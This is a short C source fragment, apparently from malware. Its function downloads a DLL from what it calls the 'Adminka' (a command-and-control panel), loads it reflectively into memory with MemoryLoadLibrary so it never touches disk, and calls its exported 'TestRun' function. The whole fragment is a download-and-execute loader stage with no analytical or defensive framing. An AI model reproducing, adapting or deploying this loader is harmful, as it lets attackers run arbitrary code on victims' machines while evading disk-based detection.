typedef void (WINAPI *TypeRunFunc)();

const char* nameLoadDll = "testdll.dll";


void LoadAndStartDll()
{
 int size;
 char* dll = LoadFileFromAdminka( nameLoadDll, &size );
 if( dll )
 {
   //u_SaveToFile( "c:\\test.bin", dll, size );
   HMEMORYMODULE hdll = MemoryLoadLibrary(dll);
   if( hdll )
   {
     TypeRunFunc func = (TypeRunFunc)MemoryGetProcAddress( hdll, "TestRun" );
     if( func )
       func();
   }
   u_free(dll);
 }
}
